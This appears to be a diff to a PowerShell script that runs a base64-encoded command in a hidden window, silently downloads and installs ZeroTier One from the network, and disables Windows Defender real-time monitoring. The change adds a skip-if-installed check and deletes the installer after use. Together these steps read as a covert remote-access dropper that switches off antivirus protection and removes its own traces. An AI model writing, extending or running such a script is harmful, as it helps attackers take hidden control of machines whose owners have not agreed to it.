@@ -42,11 +42,18 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 # Launch the script block in a new PowerShell window
 Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 
-# Download and Install ZeroTier One silently
-$zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
-$zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
-Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
-Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
+# Check if ZeroTier One is already installed by checking for its folder
+$zeroTierFolderPath = "C:\Program Files (x86)\ZeroTier\One"
+if (Test-Path -Path $zeroTierFolderPath) {
+    Write-Host "ZeroTier One installation folder found, skipping download and installation."
+} else {
+    # Download and Install ZeroTier One silently if not already installed
+    $zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
+    $zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
+    Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
+    Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
+    Remove-Item $zeroTierMsiPath -Force # Cleanup installer
+}
 
 # Disable Windows Defender Antivirus
 Set-MpPreference -DisableRealtimeMonitoring $true
